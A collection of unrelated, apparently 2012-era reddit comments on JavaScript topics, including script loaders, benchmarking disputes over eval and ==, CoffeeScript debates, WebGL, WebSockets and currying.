Know what you're doing when you do this. It's not a pure replacement for innerHTMLing things. It will completely replace the element passed in with a clone, which means things like event listeners and perhaps attached variables will not exist on the new element. 
I wasn't aware of js/HTML/CSS presentations however having seen your application I'm interested in the possibilities. I'm also very interested to see what this could develop in to. Keep up the good work!
Wow. thanks. I've been on SO all day and a few minutes of reddit solves the problem.
Can somebody tell me what AMD is for? I'm new to Javascript. I've done alot of reading so far, and am not familiar with frameworks outside of jQuery...
Scripts are by default blocking, meaning until they fully download from the server and then execute they halt all other activity in the browser. This means loading DOM, loading images, etc. To get around this a pattern was developed where you load your scripts via JS by appending script tags into the head of the document. This allows your scripts to download and execute without "blocking" the browser from constructing your DOM, download images, etc. The problem here being scripts don't always finish in order. If your jQuery plugin downloads and executes before you jQuery library is downloaded and executed you'll get a fatal error because jQuery doesn't exist thus can't be extended. Require.js and the likes are a helper framework that allows for script loading without blocking but also respect dependency and execution order. So basically I can set my jQuery plugin as requiring jQuery. Now even if my plugin finishes loading first it won't execute until the jQuery framework has fully loaded and executed. I haven't used them in production or testing, I've only read about them so this description may be a touch off as the frameworks may actually include more features like script fetching upon dependency (e.g. try to use plugin, plugin isn't loaded, so we'll fetch it) as I've heard other frameworks are going with a pattern similar to this.
I love the shit out of it http://backboneboilerplate.com &lt;- something i'm working on
Looks like a decent amount of effort went into this tutorial, going to look over it later.
You did this? If so.. nice :-) I have a small note management thingie I mostly made for myself [here](http://notesninja.appspot.com/login), where I use Markdown for my notes. The actual notes editing page kinda rips off [this](http://softwaremaniacs.org/playground/showdown-highlight/), mostly because I SUCK at CSS.. But I might just redo it, and use EpicEditor instead.
Used impress.js for a project before. Glad to see visual editors being made around it!
I wish I had done it. :) But no, you should direct your appreciation instead to one [Oscar Godson](http://oscargodson.com/). You can get his code [here](https://github.com/OscarGodson/EpicEditor).
Haha oh yeah, silly me
We (mendix.com) already use dojo and are looking to upgrade to a newer version which has better support for AMD. I do use AMD on all my personal projects. Some other pro AMD arguments: * It makes debugging easier (note) * Works cross domain (note) * Generic build tools * Proper usage will result in lesser coupled code **Note**: Depending on AMD implementation though. The dojo implementation inserts script tags which work cross domain and the browser understands it's actually a file and not some randomly evaluated code.
Came here to say this. However, if that fails, [I don't think it will, but just in case. I never quite understood quotes and escapes, really.] try escaping your single quotes: document.writeln("&lt;p style=\'color:" + favColor + ";\'&gt;");
&gt;If you don't need to develop a solution yourself this is a good point, 'cos this problem sounds very much like homework.
We can do so much better than this.....
I cannot recommend enough that you avoid using document.write and document.writeln. If the execution of those instructions is deferred they will overwrite the contents of your page's body.
* I like how the cockpit starts to shake when you enter down into Earth's atmosphere * Integrating Google Earth would be awesome
Ahh ok, maybe I'll hack around with it if I have time. Is it hosted on GitHub or somewhere? I see you have the minified code, but not the original code.
Using middlewares in ExpressJs and NodeJs
Those escapes are not necessary. Edit: When you create a literal string in Javascript, you can either use single quotes or double quotes. When you use one, it is not necessary to escape the other. Since he's using double quotes for his string literal, there is no need to escape the single quote.
http://www.reddit.com/r/javascript/buttons/
another way for fun var elements = document.getElementsByTagName("body"); var bodyElement = elements[0]; bodyElement .style.color = favColor;
is it just me or does the graph look sort of.. fractal-ish?
Come on, it's done is 1k :P
I know. It's neat. Just isn't really speech! Might be possible to do a bit better in 1K if you hardcoded support for a few words only, or if you had an external JSON table of word-&gt;phoeneme mappings or something. I'm guessing js1k doesn't really allow external data though.
Hey, great script! Just used it for a project, and it worked perfectly. My only suggestion would be to allow the Input plugin to work on non-inputs. I did a quick hack to make it work, but what I needed was to attach the toggle to a span element, then update a hidden field and the span.
This is pretty impressive for 1k of js.
&gt;I use coffeescript. Imagine how much more readable javascript becomes when you remove all the 'this' I figured out 'this' about 2 hours into learning JavaScript and have never had any trouble with it. I have Prototype's bind extracted and saved as a TextExpander snippet, as well as embedded in a generic util.js framework that I use for literally everything. &gt; , 'function', At least I can pick 'function' out of a script by sight, and it's usually highlighted because it's a keyword. Finding coffeescript's stupid arrow operators in an ocean of code makes me want to beat a puppy. &gt; and 'return' keywords I've never understood in what universe would I want a function to automatically return *anything?* Return (again, usually highlighted in any editor because it's a keyword) is instantly recognizable and lights up the exit points of your method like a beacon. CoffeeScript's automatic returns are just expressions, in an ocean of other expressions. &gt; and all the braces, semicolons, and many of the parens. Does it also bother you that you have to use punctuation in English? All of those things give your code structure. They also make nifty stuff like code folding easy, *and* I don't have to worry about what happens when I open my file in an editor that munges tabs/spaces. &gt; Imagine not ever having to worry about errors caused by forgetting to return, forgetting a semicolon, typing 'funtion' instead of function. I never forget to return. *Why* would you forget to return? I have never in my entire coding life written a function to do something and just "forgotten" to return the value at the end. 99.9999% of the time, the problem is in all the crap that came **before** the return. You know, all the stuff that you can no longer read in CoffeeScript because there are no keywords and there's no structure to the code. &gt; And maybe the best part: multiline strings. No plussing and backslashing bs. That's a genuine feature, right there. JavaScript's lack of heredoc annoys me. But not enough to put up with the rest of the crap. &gt; When I want to test my script I run 'jake compile' and it compiles it to js, bundles all my scripts together, then runs them through uglifyjs. It takes a couple of key presses and completes in half a second. And when I want to test my script, I hit Cmd+Tab and Cmd+R and it's running. &gt; I use a similar setup using less instead of css. Use SASS. LESS is just SASS dumbed down for CSS designers. SASS gives you a full scripting language, and tons more features.
Depending on how you learn; here's [31 days of canvas tutorials](http://creativejs.com/2011/08/31-days-of-canvas-tutorials/) or alternatively a bunch of [game engines](https://github.com/bebraw/jswiki/wiki/Game-Engines) and [canvas wrappers](https://github.com/bebraw/jswiki/wiki/Canvas-wrappers) to explore the source of.
Look at paperjs abstracts away all the hard stuff. Nicest Canvas library I have seen. 
That was much better than I was expecting.
Get used to writing (pseudo) non-blocking update loops with setTimeout or requestAnimationFrame (if available).
The point of the test was to show that you should avoid making blanket assumptions about performance and that you shouldn't fear the RegExp. Many times the performance difference won't be noticed in real world use. There was also a revision submitted by someone that uses memoization with some interesting results: http://jsperf.com/regexp-indexof-perf/10
@x-skeww I think you misunderstood the slide on NodeLists. We were saying the opposite. Converting a live NodeList to an array is a big perf win when iterating. Also see: http://www.nczonline.net/blog/2010/09/28/why-is-getelementsbytagname-faster-that-queryselectorall/ The slide related to the `arguments` object also contained a link to a related post with the myth: http://www.jspatterns.com/arguments-considered-harmful/
Many of these tests are busting micro optimization myths and trying to show that there is no real world perf concern here. We weren't endorsing one style over another. In fact during the presentation I mentioned I still prefer to store references to my objects instead of using the more verbose property lookups. 
We weren't trying to say one was better/worse in many cases and tried to show that in many cases the performance difference of micro-optimizations have no real world significance.
You're missing the fact that in real world use there is no difference/perf-concern. Along with the bar chart there are ops/sec and most are millions vs more-millions of operations a second.
As I've said before I reject blanket assertions to use `===` over `==` and opt for using the best operator for the job ;)
Eval isn't "evil" and is just another feature for devs to use or abuse. Eval has it's uses, for example it's used in json2.js as part of the JSON shim.
The point of the test was to show that you should avoid making blanket assumptions about performance and that you shouldn't fear the RegExp :) I wanted to use a common use case of checking if an element has a specific class name because I've seen libs toss-n-turn over using one or the other.
Eval, with-statements, arguments.callee, the Function constructor, and the like aren't "evil". They are just tools for you to use-wisely or abuse.
&gt; It's also interesting in your comment there that for like values it should perform the same for either operator, and while that's the case for most browsers, it's not even close to correct for Firefox (and to a lesser extent, Safari). Yap. Once you start benchmarking the micro performance of operators engine specific optimizations are in play and go by their own rules.
Yap, with `Function#bind` and `Array#forEach` the point of the tests was to show that by creating your own custom native-lite implementations you can get better performance over native. Many times you don't need to support all of the functionality/edge cases of the native method and that allows you to gain performance/custom-functionality and save code because you no longer need to have an ES5 compliant fallback. Many libs, like Underscore.js, fork for native methods but could reduce code/gain speed if they settled for simpler methods. Most devs don't care about supporting sparse arrays or ToUint32'ing a `length` value and this allows us to optimize for the common case. Also, by implementing a custom method you can gain functionality like exiting early by explicitly returning `false` or method chaining. See http://jsperf.com/for-vs-array-foreach/4
Well, I don't think that eval doesn't have any uses. Lazy parsing/execution is kinda neat. By the way, that "eval breaks JIT" thing is something Brendan Eich mentioned. It certainly was true at some point for Firefox's JS engine. http://jsperf.com/eval-kills Both test cases are exactly the same. &gt;The point was you shouldn't choose === over == because of performance. http://jsperf.com/eqeqeq-fail-vs-eqeq-fail === is drastically faster with Firefox and Chrome. Yep. I kinda cheated. However, this isn't completely irrelevant.
&gt; By the way, that "eval breaks JIT" thing is something Brendan Eich mentioned. It certainly was true at some point for Firefox's JS engine. &gt; http://jsperf.com/eval-kills &gt; Both test cases are exactly the same. No, the test cases are different. The key is to look in the setup. One has `eval("var str=\'hello world\'")` in its setup before the test loop and the other has `var str = 'hello world';`. Update: I did double check the compiled test and it was missing the `eval` call. So the "eval breaks JIT" is "confirmed". &gt; === is drastically faster with Firefox and Chrome. Yep. I kinda cheated. However, this isn't completely irrelevant. Nope the perf difference is completely irrelevant. If you examine the actually operations per second they are both in the millions and millions of ops/sec which means there is no real world performance difference/concern. In other words you will never hear a dev say "Oh by the way, ya know the app bottleneck turned out to be our use of `==`."
&gt;You're no longer testing the presence of eval and instead testing the use of eval in a tight loop. The second one isn't like that. There are only a handful of iterations per second. With a size of 2000 x 2000: http://jsperf.com/eval-kills/4 Firefox: With eval: 0.19 Without eval: 0.68 Chrome: With eval: 0.07 Without eval: 0.96 Big difference. `eval`'s presence clearly breaks *something*. &gt;I develop an animation framework and this is not a real issue ;P Yes, it isn't an issue for an animation framework.
I appreciate your persistance but you are incorrect. Your test revisions 2-4 are not testing what you think they are. Because you include them in the actual test block they are in the tight test loop. Slowing that down only prevents the benchmark runner from collecting enough samples to perform accurate stats. As I mentioned yes, it may disable optimizations, but that may not be relevant for real world use. &gt;&gt; I develop an animation framework and this is not a real issue ;P &gt; Yes, it isn't an issue for an animation framework. It's not a problem for an animation framework and 99.9999% of JS code, sorry. As I mentioned many of the slides were about busting micro-optimization myths and `==` vs. `===` falls into that category. Here is an example of a perf test with major perf differences (low hundreds of thousands vs. several millions of operations a second): http://jsperf.com/private-or-not-private/3#chart=bar
&gt;tight test loop 0.07 iterations per second... that's not very tight, y'know. Those two eval calls certainly did not take several seconds. &gt;accurate Doesn't matter. The speed difference is big enough to be clearly visible to the human eye. &gt;As I mentioned many of the slides were about busting micro-optimization myths Micro, yes. Myth, no. Irrelevant, generally yes. Micro optimizations are pretty useless in general.
&gt; tight test loop 0.07 iterations per second... that's not very tight, y'know. Those two eval calls certainly did not take several seconds. Accuracy does matter. You've crippled rev 4 so it's sooo slow it can't accurately be read by the benchmark runner. The better test revision is revision 1 as it tests for the simple presence of `eval` instead of testing it inside the test loop. &gt; Micro, yes. Myth, no. Irrelevant, generally yes. Micro optimizations are pretty useless in general. I donno but I think I just won that round of trolling \o/
&gt;&gt; You've crippled rev 4 so it's sooo slow it can't accurately be read by the benchmark runner. &gt; Seems to work fine. A margin of error of ±93.97% (test case w/o eval) is not fine ;) &gt; This is exactly the kind of thing which is supposed to be affected by eval. It's inside the same function, it breaks optimizations for this function. I think you're on a bit of a tangent. I've repeatedly mentioned that the presence of `eval` disables optimizations (also, the actual slide has the myth status of "plausible"). You're just creating a poorer test to prove it. Please revisit revision 1: http://jsperf.com/eval-kills Here is a post on various benchmarking techniques: http://calendar.perfplanet.com/2010/bulletproof-javascript-benchmarks/ 
My bad. I thought it was "busted". Maybe it's because you guys paired "plausible" with "busted" on slide 17 and slide 48, which is something which doesn't work with the Mysthbusters scale. ("Plausible" generally confirms the myth.) I didn't even run it. Whoops. Guess the talk was less confusing than the slides alone.
Jslint says it does weird shit, I don't understand why it's skin off my back to use ===
This made my day. "pppppppppppppppppppppp"
(I've had this reply sitting in my browser for over a week now, so apologies for how late this is.) Nice job! Here are some complaints from a front-end designer (as in, doesn't know shit about JS, just wants to help): Where I think [tinker.io](https://tinker.io) really excels is that their layout is very subtle and easily approachable. I didn't even notice the extra options under "Create" and I think given that you have the space available, those should either be their own options ("Blank" / "HTML5 Base" / "HTML5 + jQuery Base") or the entire "Create" button should trigger the drop-down, not just the tiny arrow to the right (too many people fake that UI element for the wrong reasons, plus it's an unnecessary extra click). The color of the buttons is really distracting, same with how they're not a fixed width. I realize you're posting this in the JS subreddit, as someone who would use this for visuals, having to see those colors in the corner of my eyes would irritate me. I really like the idea of the drop-down but I think it could be achieved similar to the way Tinker.io has theirs, where you see all the options at once. Again, just alleviating key clicks and making sure the user understands the possibilities at first-glance. If I'd seen those options immediately I would have been way more amped about the product than I was. Another issue that might be worth looking into is organizing the navigation/actions better so that you're not causing people to move their mouse across the screen in order to do anything. Additionally, on my Win7 machine, the + / - in the file frame are covered up by the circular Start button. Even so, they're too small to be useful down there. I'd imagine that even on a second monitor or as a minimized window, they'd still be kind of a pain to get to. Being able to adjust font-size in the code pane would be nice too. I'm not sure how I feel about Word-Wrap not being a global change, but I can see where you wouldn't want it to be. Anyways, that isn't stopping me as a designer from using it to toy with and create quick pages, but I do find jsFiddle easier because that extra click into the file is annoying instead of being able to just copy/paste. Also the ability to have an account with all of my snips stored is essential to me. Edit: Also want to add that LESS and SASS support would be tits. Excited to see where you take this!
Don't change the src of the image. Instead include both images in your document with `display: none;` - this handles the preloading part (in some browsers anyway). It's also much faster during the swap. Then: var eyeTimer; function close() { document.getElementById('#eye-closed').style.display=''; document.getElementById('#eye-opened').style.display='none'; } function open() { document.getElementById('#eye-closed').style.display='none'; document.getElementById('#eye-opened').style.display=''; } ....... onMouseOver="close(); eyeTimer=setTimeout(open, 5000);" onMouseOut="clearTimer(eyeTimer); open();" ...........
or use sprites and you'll also aave a connection.
this is the way to go, in fact this allows you to add more frames because with just two it'll look really lame.
hi~rossome~you can use CSS sprite,and use JavaSript to change the background-position attributes. i think this's better~good luck~
hi ~ fcambus, the javascript is allow only running on the browser script language , can't create a files on the client and server, the thumbnails created by js was only preview on the page.
Ahh! Gotcha... Sorry, it didn't even cross my mind that you were referring to Reddit formatting. :) Hungover, etc...
Processing is built upon java, not javascript. If you can post it somewhere with proper indenting that will make this a lot easier to fix. Try [pastebin](http://pastebin.com/). I took the liberty of fixing indents and whitespace, and adding a few comments [here](http://pastebin.com/MPGG2S16). The game doesn't work as intended I'm assuming, but I'm not sure what you want exactly. What difficulties are you having - be more specific. Also, you might want to use more descriptive variable names than p, q, etc. 
The library to decode all of those formats in pure Javascript doesn't exist yet. This is just a wrapper/widget for html5 and flash.
True, I wanted to illustrate that this could be done for any arbitrary element.
You should try the new Firefox v11. The latest version of chrome is also pretty good. Of course your own graphics card and cpu are a factor as well.
Question: Why is this some of the best we can get out of WebGL so far, whereas Flash is doing this: http://alternativaplatform.com/en/demos/maxracer/ ...and all of these...: http://www.leebrimelow.com/?p=2607 Is there really any good reason for this? Is OpenGL ES really just that bad?
Thank you so much for your reply! Now I feel silly because I was using the wrong word for it. :) My friend told me I need a function that will increment the number displayed in the HTML by 1, then keep calling itself until it matches the new number. So I just want to change that number in the &lt;h2&gt; tags, from the old value to the new value, but to count up or down instead of just instantly. Do you know what I should be doing to achieve that?
&gt;The numbers animate in some way when they are presented. Using javascript to increment/decrement values won't look very smooth. It seems to me you're trying to make it look like a odometer -- [something like this?](http://brock-family.org/gavin/software/web/odometer.html) 
setInterval will call your function repeatedly. 
Yeah the plan was just to have it count up or down; nothing smooth or flashy but at least better-looking than if it instantly changed. But YES, that odometer is exactly what I was originally planning to do, when I hit a brick wall and realized I didn't have the basic know-how yet to build it. That looks like I should just be able to call a new odometer for each section... but restyling it to fit what I have now, do you reckon that would be possible?
Was this google-translated from Chinese?
That's **exactly** what I was trying to get. Thank you so much! I will study this code like some holy scriptures.
Totally worked! Thanks you so much, I am a complete derp when it comes to javascript, and would not have figured that out. Implemented :) Forever thanked in the page source.
Although the library works well, I wish it didn't require jQuery. They're just using document.getElementBy(), and so you need to add a 140kb library for no reason. Also why would you ever write code like this Jplayer('play') When you could just as easily write Jplayer.play()
Those are some valid points. I still write javascript too, but coffeescript is easier for me to read. To address your points: 1. I was just talking about the word "this," not how it's used. Instead of `this.varName` you just type `@varName` in cs. Shorter and just as clear in concept. I stopped using bind because it felt like it obscured things a bit too much, especially when you are reading back over code. 1. That's fine. My syntax highlighting gets "`-&gt;`" and I would rather type/read "-&gt;" instead of "`function(){}`". I will concede that, with arguments, it might be less readable because the signifier that you are creating a function comes after the args: `(inputA, inputB)`-&gt;. 1. The automatic returns _are_ kind of odd, sure. But sometimes it's nice to just have "@" as your last line instead of "return this". I'm not really sold on the whole idea, but I was just trying to make a case for cs. 1. I'm not sure that your comparison to English punctuation is valid, because coffeescript is closer to english than javascript. Folding indents isn't too bad either. 1. Yeah, that's fine, forgetting to return is a newbie thing. Maybe what I should have said was forgetting a brace or a parenthesis after you refactor something, then spending 15 minutes trying to find the missed match. 1. It's really nice in combination with a micro template engine. 1. K. Do you not have an extra step to bundle and minify your scripts for production? 1. LESS is good enough for me. It has variables, arithmetic, mixins, includes, and nested style definitions. But mainly, it doesn't need ruby.
WebGL has a high technical barrier for entry. It is open source and requires working knowledge of frontend javascript and opengl (ie: glsl shaders). So like many open source initiatives (ie: linux) WebGL will only be as good as its community. Flash, on the other hand, has corporate endorsement and has a low barrier of entry. Adobe has invested in the development of GUI/WYSIWYG tools which would allow the creation of 3d web games by people with as little technical/programming knowledge as possible. Eventually comparable webgl tools will be developed to outcompete flash dev tools - and this is especially true since webgl has the endorsement of Google, Mozilla, Opera and Blackberry (through Android). Now if only Microsoft and Apple (ios) will come around.
For sound only I'd rather use [soundmanager2](http://www.schillmania.com/projects/soundmanager2/) which has a somewhat [richer API](http://www.schillmania.com/projects/soundmanager2/doc/) (visualization / equalizer data among other things) and does not require Jquery. 
The time for each step is the total animation time divided by the number of steps...
I've been using RegExr http://gskinner.com/RegExr/ which is superb. I don't see a reason to switch. 
Yeah that's my guess. 
I'll second that. These demos in Chrome on 10.6 are silky smoove for me.
I am doing this already: http://mailmarkup.org/slideshow.xhtml The necessary JavaScript is at the bottom of the HTML. Please forgive the complexity. Navigation and related meta data are automatically built with the supplied JavaScript without any manual effort. I needed the navigation to be complex enough to allow a user to press the right arrow to move forward to a new slide and again to move through each transition, but use of the left arrow should only navigate to prior slides and not through transitions. I also have table of content support as well. Look it over to see if you can just use this code to fit your needs.
Congrats!
Well, it's Flex-based, which is a shame. But on the other hand, it's clearly way superior...
Seems a clone of http://rubular.com/
If [this](https://github.com/mrskitch) is you, you should release this on GitHub!
Fun! My quick recommendation: when you're iterating over the `currency` array in the `changeMaker` function, start with `i = currency.length` rather than your "magic number" of `i = 9`. It'll make your life easier if you choose to change up the currency later, e.g. for internationalization. For practice, you could maybe try changing this into a modularized/plugin pattern, where you pass in options like `currency` and `totalInTill` to a constructor and return a ChangeMaker function.
[This might help](http://stackoverflow.com/questions/3168805/javascript-design-patterns) for long-term reference.
The beauty of git is that you can make small changes and iterate over your code. That way if you make a big mistake somewhere, you can revert those changes and get back to a working codebase :)
I'm kind of intimidated by Github. New to Git and the site. I'd like to use it for my first closed source app. Any gotchas or things I should know?
UML diagram of anything = waste of time (usually)
I've used similar techniques in Java, which for years has had a GC which I personally find suffers from worse pauses then most JS GCs. Although I also throw a lot more at the Java GC, with bigger applications. The main issues I also ran into we're with data structures, such as trees, lists, maps, sets and custom ones for collision detection. A lot of data structures are easy to model if you have lots of internal nodes, and this is generally the biggest issues I always ran into. Any data structure which was under heavy usage could easy create and release lots of objects without you realising. Things like giant arrays, or caching and reusing the internal objects, pretty much makes this a non-issue. Iterators are also a big expense in Java, and manually iterating through a data structure, or passing in a pre-built function as a callback (which is only created the once), alleviates this. Personally I have always found that it is only a small number of object types which are to blame for most GC pauses. For most types you don't have to care. edit: typos (bloody iPad!)
&gt; Javascript's regex engine does not support lookbehinds, so any JS based regex tester just won't cut it. you realize you're posting this in /r/javascript right? The audience here is people who are probably writing code in javascript - thus the lack of lookbehind support is probably not relevant...
Yeah its pretty nice. I also tried rolling my own tooltips, but eventually used Bootstraps' - it was less code to maintain basically.
 font-family: 'Lobster' ... whyyyyyyyyyyy?!
Would look 100 times smoother if the cam wouldn't spazz out all the time.
&gt;Is there really any good reason for this? Budget. Creating lots of 3d content is pretty expensive. If you want to program something like that, you'll need 3 friends who are artists. That's the kind of ratio we're dealing with.
it feels strange having to code against the fundamentals of a language/vm, good practice and common sense to make it performant, but for now there's no way around it. [i noticed it when dealing with vectors](http://jsperf.com/members-vs-closures); immutable vectors are several times slower.
&gt;It may be better to write the return value to the same (global) object every time and return that Yeah... don't. It's not like the quality of your code is too damn high and you need to fix that. &gt;You can actually re-cycle an existing object [...] by deleting all of its properties, restoring it to an empty object like {} With V8, you can create over a million objects per second. You won't be able to reset that many objects per second. Also, if you delete properties, they turn into garbage which needs to be collected. You just made it worse, really.
I spent the rest of that day working my way through exactly what was happening and I a proud to say that I got almost the entire way on my own. The one thing that I didn't fully connect was the leap to Number.call(). I can't remember the exact explanation I had in my head but I am pretty sure that I didn't come up with the same as you; your's being more logical and accurate. Thank you.
My favorite part was when they wrote their own array index removal function. `splice`, a built in function, accomplishes the same thing and looks nearly identical in implementation to theirs. It's hard to take advice from a blog post about performance when it contains the most awful implementation of `splice` I've ever seen.
You seem to be missing the point. &gt; nearly identical in implementation to their Yes, emphasis on "nearly"; the "small" difference in their implementation is the whole point. Their version modifies the array **in place**, while Array.prototype.splice (per the ECMAscript specification) creates a **new array object**. For their use case this was undesirable as they didn't require a new array object. They're not saying "switch to our better faster version of splice". They're saying that splice is useful for quickly and easy hacking apart arrays in normal code, but in hot sections of code you might not want to use it. The whole point of the article is that your "normal" JavaScript habits are fine for most applications, but you have to tweak them a bit in code that is intended to run fast and often. 
Since this is a fairly old blog, the speed difference isn't as large as it used to be, I was surprised that his test page still showed an increase with his custom function though.
I couldn't get past "host on IIS"
Here is a response to that (not mine): http://f.cl.ly/items/3i1l1e3n2m062y0v3l2a/low_gc_note.mp4
Well... I work at Microsoft programming in VIM on Linux machines in Ruby on Rails using mySQL/Oracle/Cassandra databases and the Apache webserver. (I use node.js as well.) Use what works best to solve the problem you have at hand.
smooth in Safari Mac 5.1.4
my cat likes it.
Flickers a lot in Chrome 17.0.963.79 m on Windows 7 64 bit.
Nobody's perfect...
That needs to be a standard in all browsers.
thanks a lot for that hint. i just whipped that benchmark up quick and didn't question the results because they somewhat reflected what i've been expecting. benchmarking *is* hard. though i still don't understand what maritz pointed out - it seems, the garbage collector doesn't seem to kick in at all.
now that you mention it - i tried it myself and can confirm your conclusion. memory usage stays around 600mb even after the test is finished ... edit: i used chrome 17, and memory usage peaked at ~600mb and didn't drop afterwards. now i tested it with FF 12 (w/o firebug, not out for v12 yet), and task manager reported a peak of around 500mb that dropped to about half afterwards. i guess the closures code has got a memory leak in it somewhere.
Who's response is that? Be interested to know
http://twitter.com/jdalton
Wow! I'm really impressed it works fine (very smoothly) on my iPhone (4S)! Mobile Safari sure had come a long way... Wonder how it performs on android or iPad...
This is genius and I absolutely must remember to use this technique in future projects. How am I going to remember? Argghhh
Oh oh, Grandpa's trying to be cool again!
This is awesome, thank you!
Strangely if you go directly to it, no flicker. https://developer.mozilla.org/media/uploads/demos/b/o/boblemarin/ae113b18ab7bf8a52635831a36dbc7c8/the-box_1332239429_demo_package/index.html
Too bad it won't work in IE for 10 years.
I am going to use this! Thanks!
You might want to add a link.
Wow, I'm sorry but that seems horrible. (I'm blaming your university not you)
Well, if you throw a dozen properties away, you have some garbage. Throwing one more object away won't have much of an impact. (Those properties were objects, too.) Also, short-lived objects are cheaper to collect, if a generational GC is used. The author didn't measure anything. He doesn't know if he actually managed to reduce the length of GC pauses or not. Generally speaking, optimizations like this are completely pointless. There are way too many moving targets: V8+ARM, JSC+ARM+Power, JM/TM+ARM, Chakra, Carakan+ARM... Are you going to test your optimizations with all of those whenever one was updated? Are you going to create 20 different builds? Of course you won't. People can't be even arsed to that kind of thing with just one VM and just one architecture. Also, browser vendors are trying to reduce the length of GC pauses. It's easier for them if you don't do any weird stuff.
It's basically a dedicated open connection. Currently HTTP will open a connection, send data then close. This keeps a steady connection open so there's less overhead with establishing a connection and closing it when the page or data is transferred. I assume you are a fairly smart 5 year old ;) If you are not: Currently the web works like a bucket. You pass a bucket to the server who fills it with water and passes it back to you to dump out. Web sockets is like a hose. You can pass water back and forth as much as you can without having to worry about the bucket.
Ah nice so you can do something like AJAX but on its own dedicated connection not interfering with HTTP. Is that a correct conclusion?
Yeah, Ajax still relies on the bucket of data, but it does it behind a screen so you are unaware it's happening. The nice thing about being connected with web sockets is that the server can "push" data to you (news feeds, chat...) Currently you have to request updates every so many seconds.
Check MX DNS-record during signup.
As a former quasi-netadmin, this has always been my recommendation. &lt;?php getmxrr('example.org', $mxs); foreach ($mxs as $mx) { $fp = fsockopen($mx, 25, $errno, $errstr, 5); if ($fp) { // implement as with telnet, see the bottom portion of // http://www.anta.net/misc/telnet-troubleshooting/smtp.shtml if ($isValidSmtp) { break; } } } ?&gt;
Tried the kitchensink on my iPhone and was not that impressed. The scrolling option has some quirks (I think all mobile framework have this) and I found the responsiveness not that well. Sometimes had to push a button three times before anything happened. Also no 'down' state, so I am not sure if I missed it two times or it was loading.
 b b s b b s b b b s b b s b b s b b s b b b s b b s 
The thing I think he's missing is this is for lazy loading your javascript code, and getting async callbacks when that code is available.
Also, Web Sockets use a different protocol: * ws://endpoint_url * wss://secure_endpoint_url There are no extraneous HTTP headers in this protocol. You have to have a server that works with the new protocol, however...When you try to make a WS connection, you'll pass an upgrade header in your request, if the server responds with appropriate upgrade header(s), you've got a WS connection.
Beautiful.
[I'm here to help.](http://lmgtfy.com/?q=javascript+background+color+change)
Agreed, this library knocks the socks of the other ones I've used, namely kendo ui's and highcharts. Can't wait to use it in my reporting system 
Thanks! Send a link my way if you do end up using it. Would love to see it in the wild.
What is the value of `color2`? We need to see the complete code. Make a jsfiddle and post the URL. 
Nope. But here's WebDirectX!
http://www.sitepoint.com/books/javascript1/ this is a fantastic book. 
I believe you are right. I ran into a similar thing in along time ago in a CS class where I was appending to a string in Java (not JS) . When I changed the code to push elements to an array instead it was much faster.
[This example](http://plunker.no.de/edit/TfGnYT) is a bit more verbose than if you were to use a library that handles selectors/animation. I figure it might useful to learn how to do something like this without relying on libraries though.
Everything?
Thanks, but this would work with highcharts too! The demos you see are using a [flotr2](http://humblesoftware.com/flotr2/index) adapter.
I love this one: https://github.com/bgrins/javascript-astar
I like wickedchicken's explanation. I also found [this blog post](https://msmvps.com/blogs/jon_skeet/archive/2012/01/30/currying-vs-partial-function-application.aspx) pretty helpful.
Ok... thank you, this is good... I was trying to create an example to illustrate both with a simple add function in javascript and was failing quite miserably. Let me see if I have this straight: function add(a,b,c) { return a + b + c; } curryAdd = curry(add); currAdd(a)(b)(c) == add(a,b,c); partialAdd = partial(add); partialAdd(a)(b,c) == add(a,b,c); Do I have that right? Maybe a better example would be one that doesn't involve an associative function... but is curry simply a special case of partial? Could you easily build a curry function from a partial function?
Awesome, thank you
I made this webpage to help figure out which algorithms will be faster than others in Javascript. I often find myself reading forums where people discuss various methods that do similar tasks and some claim that one method is faster than the other. Now I have a way to test it. I'll eventually add some sharing support and storage for tests that I can use to create charts for different browsers. I'll also add some logic for remembering input, rather than having a page refresh set everything back to the default values (edit: added cookies to fix this).
Use [bind](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/bind) to solve this problem (no pun intended).
Wanted something easy and figured it'd be fun to make something myself.
Thanks to the variations between engines, I know it would be virtually impossible to get a to-the-byte precision. So a rough estimate would be okay. Just something to give me an idea. the first thing I tried it on gave me a 1.1 MB object size which is in the ballpark for the object. 
It wasn't necessary I new the problem was with that line i had been in front of the computer for 10 hrs so must have been over looking the obvious by then but after half a good night sleep i got it 1st thing this morning 
Well I'm glad you got it figured out, but you should try to put a bit more time in to communication if you want random strangers to help you. Read this: [Rubber Duck Problem Solving](http://www.codinghorror.com/blog/2012/03/rubber-duck-problem-solving.html)
Could you elaborate a bit on how you feel this will ruin the language? This is very similar to other module loading syntax in other languages (like python, for example). Presently, there is no language support for modules in JS.
Ah, in that case, I'd probably use the closured anonymous function (or bind() as the other poster stated, when it becomes standard.) Telling people to avoid "this" can cause other issues, so I'm a bit leery on recommending that someone do it the "absolute()" method way. I could only imagine someone new reading this and thinking they'd need a special callback for each object in order for it to work. You could have also done: callback.apply(test); to apply scope to the callback and it should work as well. Of course, depending on the scenario, you'd have to pass the scope object to some_function()... There are a million different way to write a program. ;)
Not exactly a library, but useful (eloquent) code and guide for A*: http://eloquentjavascript.net/chapter7.html
Those would all work. I think _.bindAll is my preference; as it means the function receiving the callback doesn't need to know anything about it or its context.
As a matter of course, I alias `this` to `self` in the enclosing scope whenever I'm creating callbacks: function callback_maker() { var self = this; return function() { self.whatever }; } I also set my syntax highlighting to show `this` in red and `self` in green. It's a handy visual reminder that `this` is dangerous and requires my special attention.
Call and apply would certainly work, but like I said in my response to x-skeww, I'd prefer that some_function not know anything about the callbacks it's receiving. In my case, the function in question is called in multiple places throughout the app and needs to play nicely with functions (that don't care about scope) and methods (that sometimes do). I could make the second parameter optional and only use call/apply conditionally, but that just complicates things unnecessarily. 
So technically it'll be closer to reality if I only use it on objects that don't have any external references.. Like an object that I use as a JSON data store. 
What are you talking about? CommonJS modules are a spec is used in NodeJS. Its not a library at all. Even if you were right and it was a library why does that make it a bad solution? There is nothing stopping a code pattern from becoming part of the language, especially if its simple. PHP namespaces have nothing to do with JavaScript. Its not a fair comparison anyway. Name spacing is an entirely different feature.
Well you should be good then. Good luck.
Depends on your preferred learning style. If you're interested in a video course, try Udemy: http://www.udemy.com/beginning-javascript/.
Whenever I see this type of stuff, it seems really interesting but I'm never sure where it's practical application comes in. The JS I typically write is admittedly nothing too complicated as it's mostly front-end interaction type of stuff and not drastically application-y. Can anyone give some insight?
